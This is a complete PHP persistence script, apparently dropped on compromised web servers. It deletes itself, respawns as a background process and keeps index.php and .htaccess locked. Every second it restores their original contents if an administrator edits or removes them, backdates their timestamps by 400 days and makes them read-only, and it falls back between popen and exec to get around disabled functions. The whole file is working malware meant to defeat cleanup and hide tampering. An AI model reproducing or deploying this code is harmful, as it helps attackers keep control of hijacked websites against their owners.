<?php  
/*
* lock file 2020
* fuck from zz
*
* 2001-10-01
*/
$current_file_path = __FILE__;
$current_dir = realpath(dirname($current_file_path)); 
$current_file_name = str_replace($current_dir, '', $current_file_path);
$current_file_name = str_replace("/", '', $current_file_name);
$current_file_name = str_replace("\\", '', $current_file_name);

function getPhpPath()
{
    ob_start();
    phpinfo(1);
    $info = ob_get_contents();
    ob_end_clean();
    preg_match("/--bindir=([^&]+)/si", $info, $matches);
    if (isset($matches[1]) && $matches[1] != '') {
        return $matches[1] . '/php';
    }
    preg_match("/--prefix=([^&]+)/si", $info, $matches);
    if (!isset($matches[1])) {
        return 'php';
    }
    return $matches[1] . '/bin/php';
}
$php_path = getPhpPath();

function is_cli() {
    $is_cli = preg_match("/cli/i", php_sapi_name()) ? true : false;
    if ($is_cli === false) {

        if (isset($_SERVER['argc']) && $_SERVER['argc'] >= 2) {
            $is_cli = true;
        }
    }
    if ($is_cli === false) {
        if (!isset($_SERVER['SCRIPT_NAME'])) {
            $is_cli = true;
        }
    }
    return $is_cli;
}

function run($code, $method = 'popen')
{
    $disabled = explode(',', ini_get('disable_functions'));
    $new_disable = array();
    foreach ($disabled as $item) {
        $new_disable[] = trim($item);
    }
    if (in_array($method, $new_disable)) {
        $method = 'exec';
    }
    if (in_array($method, $new_disable)) {
        return false;
    }
    $result = '';
    switch ($method){
        case 'exec':
            exec($code,$array);
            foreach ($array as $key => $value) {
                $result .= $key . " : " . $value . PHP_EOL;
            }
            return $result;
            break;
        case 'popen':
            $fp = popen($code,"r");   
            while (!feof($fp)) {     
                $out = fgets($fp, 4096);
                $result .= $out;       
            }
            pclose($fp);
            return $result;
            break;
        default:
            return false;
            break;
    }
}

function functionCheck()
{
    $disabled = explode(',', ini_get('disable_functions'));
    $new_disable = array();
    foreach ($disabled as $item) {
        $new_disable[] = trim($item);
    }
    if (in_array('exec', $new_disable) && in_array('popen', $new_disable)) {
        return false;
    }
    return true;
}

$lock_file_index = 'index.php';
$lock_file_h = '.htaccess';



if (is_cli() ||  @$_GET['ok'] != null) { 
	@unlink($current_file_path); 
	$lock_file_path = $current_dir . '/' . $lock_file_index;
	$lock_file_path_h = $current_dir . '/' . $lock_file_h;
    $content = file_get_contents($lock_file_path);
	$content_h = file_get_contents($lock_file_path_h);
    $hash_content = hash('sha1', $content);
	$hash_content_h = hash('sha1', $content_h);
    while (true) {
        if (!file_exists($lock_file_path)) {
            @file_put_contents($lock_file_path, $content);
            @touch($lock_file_path, strtotime("-400 days", time()));
            @chmod($lock_file_path, 0444);
        }
		if (!file_exists($lock_file_path_h)) {
            @file_put_contents($lock_file_path_h, $content_h);
            @touch($lock_file_path_h, strtotime("-400 days", time()));
            @chmod($lock_file_path_h, 0444);
        }
        $new_content = file_get_contents($lock_file_path);
		$new_content_h = file_get_contents($lock_file_path_h);
        if (file_exists($current_file_name)) {
            break;
        }
        $new_hash_content = hash('sha1', $new_content);
		$new_hash_content_h = hash('sha1', $new_content_h);
        if ($new_hash_content != $hash_content) {
            @unlink($lock_file_path);
            @file_put_contents($lock_file_path, $content);
            @touch($lock_file_path, strtotime("-400 days", time()));
            @chmod($lock_file_path, 0444);
        }
		if ($new_hash_content_h != $hash_content_h) {
            @unlink($lock_file_path_h);
            @file_put_contents($lock_file_path_h, $content_h);
            @touch($lock_file_path_h, strtotime("-400 days", time()));
            @chmod($lock_file_path_h, 0444);
        }
        sleep(1);
    } 
}


if (functionCheck() !== false) { 
	run("nohup $php_path " . $current_file_path . " >/dev/null 2>&1 &");
	if(file_exists($current_file_name)){
		echo 'no function! <a href="'.$current_file_name.'?ok=1">go go go</a>';
	}else{
		echo 'ok ok ok!';
	}
} else {
	echo 'no function! <a href="'.$current_file_name.'?ok=1">go go go</a>'; 
}